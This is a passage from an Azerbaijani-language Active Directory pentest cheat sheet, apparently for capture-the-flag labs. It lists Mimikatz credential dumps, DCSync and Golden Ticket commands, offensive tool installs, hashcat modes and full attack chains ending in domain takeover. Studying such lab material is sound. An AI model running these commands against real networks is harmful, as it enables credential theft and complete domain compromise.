.\mimikatz.exe "privilege::debug" "lsadump::sam" exit
.\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:domain.local /user:Administrator" exit
```

### 15.5 Golden Ticket (krbtgt hash əldə etdikdən sonra — tam domen üzərində davamlı giriş)

```bash
# impacket ilə (krbtgt NTLM hash və domain SID lazımdır)
impacket-ticketer -nthash <krbtgt_NTLM_hash> -domain-sid <DOMAIN_SID> -domain domain.local Administrator

export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass domain.local/Administrator@<dc_hostname>
```

### 15.6 Flag/Fayl Qovluğuna Giriş (icazə problemi olduqda)

```powershell
takeown /F C:\DCSync_Proof /R
icacls C:\DCSync_Proof /grant SYSTEM:F /T
type C:\DCSync_Proof\flag.txt
```

---

## 16. Tool Quraşdırma — One Block

```bash
# Impacket (GetUserSPNs, GetNPUsers, psexec, wmiexec, secretsdump, ticketer)
pip3 install impacket

# netexec / crackmapexec
pip3 install netexec
pip3 install crackmapexec

# evil-winrm
gem install evil-winrm

# enum4linux-ng
apt install enum4linux-ng -y

# ldap-utils (ldapsearch)
apt install ldap-utils -y

# hashcat / john
apt install hashcat -y       # john adətən pre-installed (Kali)

# bloodhound-python + bloodyAD
pip3 install bloodhound bloodyAD

# kerbrute (password spraying)
go install github.com/ropnop/kerbrute@latest

# gpp-decrypt
apt install gpp-decrypt -y

# GodPotato
wget https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET4.exe

# PrintSpoofer
wget https://github.com/itm4n/PrintSpoofer/releases/latest/download/PrintSpoofer64.exe

# winPEAS
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe

# rockyou wordlist (əgər yoxdursa)
gunzip /usr/share/wordlists/rockyou.txt.gz
```

---

## 17. Quick Reference Cədvəllər

### Portlar

| Port | Servis | Niyə Vacibdir |
|---|---|---|
| 53 | DNS | Domen adı resolve etmək üçün |
| 88 | Kerberos | DC tapdığını təsdiqləyir |
| 135 | RPC Endpoint Mapper | RPC servisləri |
| 139 | NetBIOS | Köhnə SMB |
| 389 | LDAP | AD-ə sorğu — anonymous bind dərhal sına |
| 445 | SMB | File share-lər — birinci enumerasiya et |
| 464 | Kpasswd | Kerberos şifrə dəyişimi |
| 593 | RPC over HTTP | |
| 636 | LDAPS | LDAP üzərindən SSL |
| 3268 | GC LDAP | Global Catalog — bütün forest-i əhatə edir |
| 3269 | GC LDAPS | |
| 3389 | RDP | Tapılan credential ilə GUI giriş |
| 5985 | WinRM | evil-winrm shell — hər credential-dan sonra yoxla |
| 5986 | WinRM SSL | |

### Hashcat Modları

| Hash növü | Mode | Komanda |
|---|---|---|
| NTLM | 1000 | `hashcat -m 1000 hash.txt rockyou.txt` |
| Kerberoasting (TGS) | 13100 | `hashcat -m 13100 kerb.hash rockyou.txt` |
| AS-REP Roasting | 18200 | `hashcat -m 18200 asrep.hash rockyou.txt` |
| Net-NTLMv2 | 5600 | `hashcat -m 5600 netntlm.hash rockyou.txt` |

### userAccountControl Bit Flags (LDAP filtrlərdə)

| Bayraq | Decimal | OID Filtri |
|---|---|---|
| ACCOUNTDISABLE | 2 | `(userAccountControl:1.2.840.113556.1.4.803:=2)` |
| DONT_REQ_PREAUTH | 4194304 | `(userAccountControl:1.2.840.113556.1.4.803:=4194304)` |

### Flag-ların ən çox gizləndiyi atributlar (Holberton lab-ların təcrübəsi)

| Atribut | Harada görünür |
|---|---|
| `description`, `info`, `comment` | İstifadəçi/qrup — default LDAP query-də belə görünür, amma CME basic mode-da görünməyə bilər |
| `adminDescription` | Domen/obyekt — yalnız `*` ilə sorğuda görünür |
| `extensionAttribute1-15` | User — yalnız `*` ilə |
| `homeDirectory`, `employeeType`, `homePhone`, `otherTelephone`, `mobile` | User — Get-ADUser-də `-Properties *` lazımdır |
| RPC `unknown_*` / `user_parameters` | `queryuser` ilə RPC üzərindən |
| Windows Registry `HKLM:\SOFTWARE\<custom_key>` | Shell əldə etdikdən sonra |

---

## 18. Tam Hücum Zəncirləri (Real Nümunələr)

### Zəncir A — Klassik "GPP → Kerberoast → Administrator" (HTB Active üslubu)

```
Nmap
 ↓
Null Session SMB (netexec smb -u '' -p '')
 ↓
Share Enumeration (smbclient -L, netexec --shares)
 ↓
SYSVOL-u Spider et (netexec -M spider_plus)
 ↓
Groups.xml tap (find . -name Groups.xml)
 ↓
cpassword çıxar (cat Groups.xml)
 ↓
gpp-decrypt "<cpassword>"  →  svc_tgs credential-ı
 ↓
Credential-ı validasiya et (netexec smb -u svc_tgs -p '...')
 ↓
SPN Enumeration (impacket-GetUserSPNs domain/svc_tgs)
 ↓
Kerberoasting (-request > tgs.txt)
 ↓
john --format=krb5tgs tgs.txt  →  Administrator hash
 ↓
smbclient //IP/C$ -U 'domain\Administrator'  →  Root flag
```

### Zəncir B — "AS-REP → Hidden LDAP Attribute"

```
Anonymous LDAP enum → description-da "no kerberos preauth" görürsən
 ↓
impacket-GetNPUsers domain.local/legacy -no-pass -dc-ip <IP>
 ↓
hashcat -m 18200 → plaintext password
 ↓
ldapsearch -D "legacy@domain.local" -w '<pass>' "(sAMAccountName=legacy)" comment
 ↓
FLAG{...}
```

### Zəncir C — "BloodHound Full Chain" (spray → ACL → DCSync → Golden Ticket)

```
Verilmiş low-priv credential (bh_intern)
 ↓
bloodhound-python -c All  →  BloodHound GUI-də qrafı analiz et
 ↓
Password Spray  →  IT Support account compromise
 ↓
BloodHound-da görürsən: bu account → GenericAll → bh_sysadmin
 ↓
bloodyAD / Set-DomainUserPassword  →  bh_sysadmin şifrəsini sıfırla
 ↓
bh_sysadmin ilə login  →  homePhone atributunda FLAG
 ↓
BloodHound-da görürsən: bh_sysadmin (və ya başqa hesab) → DCSync hüquqları
 ↓
impacket-secretsdump -just-dc  →  Administrator + krbtgt NTLM hash
 ↓
impacket-ticketer  →  Golden Ticket
 ↓
Domain Admin / tam domen nəzarəti
```

### Zəncir D — "Misleading Share Name" Dərsi

```
SMB enum → şərhlərdə görürsən: FlagShare, IT, HR, Finance
 ↓
FlagShare-ə baxırsan → BOŞ görünür (adı aldadıcıdır!)
 ↓
netexec -M spider_plus ilə BÜTÜN share-ləri tam tara
 ↓
Əsl fayl IT share-də imiş (flag_t2.txt, passwords.txt)
 ↓
smbclient //IP/IT -U 'user%pass' → get flag_t2.txt
```

> 🧠 **Dərs:** Share/qrup adlarına güvənmə. Həmişə tam, sistematik enumerasiya et.

---

## 19. Faydalı Linklər

- **HackTricks — AD Methodology (ən geniş bələdçi):** https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
- **Impacket (GitHub):** https://github.com/fortra/impacket
- **evil-winrm (GitHub):** https://github.com/Hackplayers/evil-winrm
- **BloodHound:** https://github.com/SpecterOps/BloodHound
- **BloodHound.py (collector):** https://github.com/dirkjanm/BloodHound.py
- **PowerView / PowerSploit:** https://github.com/PowerShellMafia/PowerSploit
- **bloodyAD:** https://github.com/CravateRouge/bloodyAD
- **GodPotato:** https://github.com/BeichenDream/GodPotato
- **PrintSpoofer:** https://github.com/itm4n/PrintSpoofer
- **PEASS-ng (winPEAS):** https://github.com/carlospolop/PEASS-ng
- **Mimikatz:** https://github.com/gentilkiwi/mimikatz
- **NetExec (CrackMapExec davamı):** https://github.com/Pennyw0rth/NetExec
- **kerbrute:** https://github.com/ropnop/kerbrute
- **GPP cpassword (MS14-025 izahı):** https://www.cyberis.co.uk/2021/01/microsoft-group-policy-passwords-gpp.html
- **Kerberoasting izahı (Harmj0y):** https://harmj0y.medium.com/kerberoasting-without-mimikatz-32cb5e7df30b
- **AS-REP Roasting izahı:** https://www.tarlogic.com/blog/how-to-attack-kerberos/

---
